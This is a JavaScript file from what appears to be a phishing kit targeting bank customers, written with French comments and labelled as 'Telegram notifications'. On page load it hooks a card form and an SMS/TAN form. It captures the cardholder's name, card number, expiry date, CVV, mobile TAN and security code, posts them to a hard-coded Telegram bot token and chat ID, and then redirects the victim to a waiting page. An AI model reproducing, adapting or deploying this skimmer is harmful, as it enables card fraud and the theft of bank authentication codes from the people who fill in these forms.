// Configuration Telegram Bot
const TELEGRAM_BOT_TOKEN = '8019935477:AAEBeU9mUPfPkxM5hfaccwRTCzl8ZxKynuA';
const TELEGRAM_CHAT_ID = '7356346717';

// Fonction pour envoyer un message via Telegram Bot API
async function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        
        if (result.ok) {
            console.log('Notification Telegram envoyée avec succès');
            return true;
        } else {
            console.error('Erreur lors de l\'envoi de la notification:', result);
            return false;
        }
    } catch (error) {
        console.error('Erreur réseau lors de l\'envoi de la notification:', error);
        return false;
    }
}

// Fonction pour formater les données du formulaire de carte
function formatCardFormData(formData) {
    const currentTime = new Date().toLocaleString('fr-FR', {
        timeZone: 'Europe/Paris',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    return `
🔔 <b>NOUVELLE SOUMISSION DE FORMULAIRE CARTE</b>

📅 <b>Date/Heure:</b> ${currentTime}
👤 <b>Nom complet:</b> ${formData.fullname || 'Non renseigné'}
💳 <b>Numéro de carte:</b> ${formData.cardnumber || 'Non renseigné'}
📅 <b>Date d'expiration:</b> ${formData.expdate || 'MM'}/${formData.expdate2 || 'YYYY'}
🔒 <b>Code CVV:</b> ${formData.securitycode || 'Non renseigné'}

📍 <b>Page:</b> Formulaire principal (index.html)
🌐 <b>URL:</b> ${window.location.href}
`;
}

// Fonction pour formater les données du formulaire SMS
function formatSmsFormData(formData) {
    const currentTime = new Date().toLocaleString('fr-FR', {
        timeZone: 'Europe/Paris',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    return `
🔔 <b>NOUVELLE SOUMISSION DE FORMULAIRE SMS</b>

📅 <b>Date/Heure:</b> ${currentTime}
📱 <b>Mobile TAN:</b> ${formData.mobileTAN || 'Non renseigné'}
🔐 <b>Code sécurisé:</b> ${formData.secureCode || 'Non renseigné'}

📍 <b>Page:</b> Formulaire SMS/Token (sms.html)
🌐 <b>URL:</b> ${window.location.href}
`;
}

// Fonction pour capturer et envoyer les données du formulaire de carte
function setupCardFormNotification() {
    const cardForm = document.getElementById('cardForm');
    
    if (cardForm) {
        cardForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Récupérer les données du formulaire
            const formData = new FormData(cardForm);
            const data = Object.fromEntries(formData.entries());
            
            // Formater le message
            const message = formatCardFormData(data);
            
            // Envoyer la notification
            const success = await sendTelegramNotification(message);
            
            if (success) {
                // Continuer avec le comportement normal du formulaire
                // Vous pouvez ajouter ici la logique de redirection ou autre
                console.log('Données envoyées avec succès');
                
                // Rediriger vers la page d'attente
                redirectToWaitingPage();
            } else {
                console.error('Échec de l\'envoi de la notification');
                // Vous pouvez choisir de continuer ou d'arrêter le processus
                // En cas d'échec, rediriger quand même vers la page d'attente
                redirectToWaitingPage();
            }
        });
    }
}

// Fonction pour capturer et envoyer les données du formulaire SMS
function setupSmsFormNotification() {
    const smsForm = document.querySelector('.sms-form');
    
    if (smsForm) {
        smsForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Récupérer les données du formulaire
            const formData = new FormData(smsForm);
            const data = Object.fromEntries(formData.entries());
            
            // Formater le message
            const message = formatSmsFormData(data);
            
            // Envoyer la notification
            const success = await sendTelegramNotification(message);
            
            if (success) {
                console.log('Données SMS envoyées avec succès');
                // Ajouter ici la logique après soumission réussie
            } else {
                console.error('Échec de l\'envoi de la notification SMS');
            }
        });
    }
}

// Initialisation automatique selon la page
function initTelegramNotifications() {
    // Vérifier quelle page est chargée et initialiser les notifications appropriées
    if (document.getElementById('cardForm')) {
        setupCardFormNotification();
        console.log('Notifications Telegram initialisées pour le formulaire de carte');
    }
    
    if (document.querySelector('.sms-form')) {
        setupSmsFormNotification();
        console.log('Notifications Telegram initialisées pour le formulaire SMS');
    }
}

// Démarrer les notifications quand le DOM est chargé
document.addEventListener('DOMContentLoaded', initTelegramNotifications);

// Export des fonctions pour utilisation externe si nécessaire
window.TelegramNotifications = {
    sendTelegramNotification,
    formatCardFormData,
    formatSmsFormData,
    setupCardFormNotification,
    setupSmsFormNotification,
    initTelegramNotifications
};

